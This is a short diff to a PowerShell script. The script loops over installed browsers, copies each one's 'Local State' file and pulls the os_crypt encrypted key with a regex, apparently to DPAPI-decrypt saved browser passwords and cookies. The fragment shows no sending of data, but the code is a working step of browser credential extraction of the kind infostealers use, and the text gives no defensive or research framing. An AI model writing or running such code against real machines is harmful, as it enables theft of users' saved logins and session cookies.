@@ -451,8 +451,10 @@ foreach ($b in $Browsers)
         Copy-Item $lsPath $lsC -Force
         try
         {
-            $j = Get-Content $lsC -Raw | ConvertFrom-Json
-            $b64 = $j.os_crypt.encrypted_key
+           $lsRaw = Get-Content $lsC -Raw
+$m = [regex]::Match($lsRaw, '"encrypted_key"\s*:\s*"([^"]+)"')
+if (-not $m.Success) { throw 'encrypted_key nicht im Local State gefunden' }
+$b64 = $m.Groups[1].Value
             $raw = [Convert]::FromBase64String($b64)
             if ($raw.Length -gt 5 -and [Text.Encoding]::ASCII.GetString($raw, 0, 5) -eq 'DPAPI')
             {
